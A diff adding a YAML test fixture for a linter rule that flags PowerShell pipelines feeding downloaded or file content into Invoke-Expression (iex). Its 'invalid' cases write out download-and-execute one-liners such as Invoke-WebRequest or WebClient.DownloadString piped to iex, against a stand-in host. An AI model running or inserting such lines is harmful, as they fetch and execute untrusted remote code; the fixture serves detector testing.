@@ -1,0 +1,38 @@
+id: powershell-invoke-expression-piped-input
+valid:
+# Direct invocation without Invoke-Expression: the preserve case.
+- 'Get-Process | Sort-Object CPU'
+- 'Invoke-WebRequest http://example.test | Select-Object -First 1'
+# Downloaded but never executed: assigned, or written to disk.
+- '$data = Invoke-WebRequest http://example.test'
+- 'Invoke-WebRequest http://example.test -OutFile C:\tmp\a.txt'
+- '$text = (New-Object Net.WebClient).DownloadString($u)'
+# Unpiped Invoke-Expression is the other rule's shape, not this one.
+- 'Invoke-Expression $cmd'
+- 'iex $cmd'
+- "Invoke-Expression 'Get-Date'"
+# Sink name only in a comment or a string.
+- '# Get-Content f.txt | iex'
+- '$s = "Get-Content f.txt | iex"'
+- "$s = 'Invoke-WebRequest http://example.test | Invoke-Expression'"
+# A pipeline into a different cmdlet whose name merely contains the alias.
+- 'Get-Content f.txt | Invoke-Expressionist'
+- 'Get-Content f.txt | iexplore'
+# Parser-error control: unbalanced brace must not produce a finding.
+- 'Get-Content f.txt | iex {'
+invalid:
+# Alias and fully-qualified name, both casings.
+- 'Invoke-WebRequest http://example.test | iex'
+- 'Invoke-WebRequest http://example.test | IEX'
+- 'Invoke-WebRequest http://example.test | Invoke-Expression'
+- 'Invoke-RestMethod http://example.test | invoke-expression'
+# File content piped into the interpreter.
+- 'Get-Content payload.txt | iex'
+# Method-call upstream stage rather than a command.
+- '(New-Object Net.WebClient).DownloadString($u) | iex'
+# Named parameter on the upstream stage.
+- 'Invoke-WebRequest -Uri http://example.test | iex'
+# Splatting on the upstream stage.
+- 'Invoke-WebRequest @params | iex'
+# Longer pipeline: the sink is the last of three stages.
+- 'Invoke-WebRequest http://example.test | Select-Object -ExpandProperty Content | iex'
